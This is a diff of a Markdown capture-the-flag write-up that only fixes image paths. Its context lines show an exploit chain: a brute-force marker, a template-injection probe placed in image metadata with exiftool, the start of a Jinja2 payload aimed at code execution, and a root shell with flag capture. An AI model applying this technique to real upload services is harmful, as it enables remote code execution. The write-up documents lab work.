@@ -200,7 +200,7 @@ code=§1234§
 1. **Logo Upload** - Upload new site logo (PNG files only)
 2. **User Permissions** - Upgrade any user's role to admin
 
-![Admin Panel](../images/admin_panel.png) 
+![Admin Panel](images/admin_panel.png) 
 
 **Logo Preview Endpoint:**
 
@@ -223,7 +223,7 @@ convert -size 1x1 xc:white /tmp/test.png
 exiftool -Artist='{{7*7}}' /tmp/test.png
 ```
 {% endraw %}
-![SSTI Confirmed](../images/ssti_confirmed.png)
+![SSTI Confirmed](images/ssti_confirmed.png)
 
 **Result:** Uploaded image, accessed preview - **"49" appeared** in the Artist field.
 
@@ -251,9 +251,9 @@ exiftool -Artist='{{ self._TemplateReference__context.cycler.__init__.__globals_
 
 ### Step 6: Flag Capture
 
-![Root Shell](../images/rce_access.png) 
+![Root Shell](images/rce_access.png) 
 
-![Flag](../images/flag.png)
+![Flag](images/flag.png)
 
 > **⚠️ Note:** Server was running as root - no privilege escalation required. This is a critical misconfiguration.
 
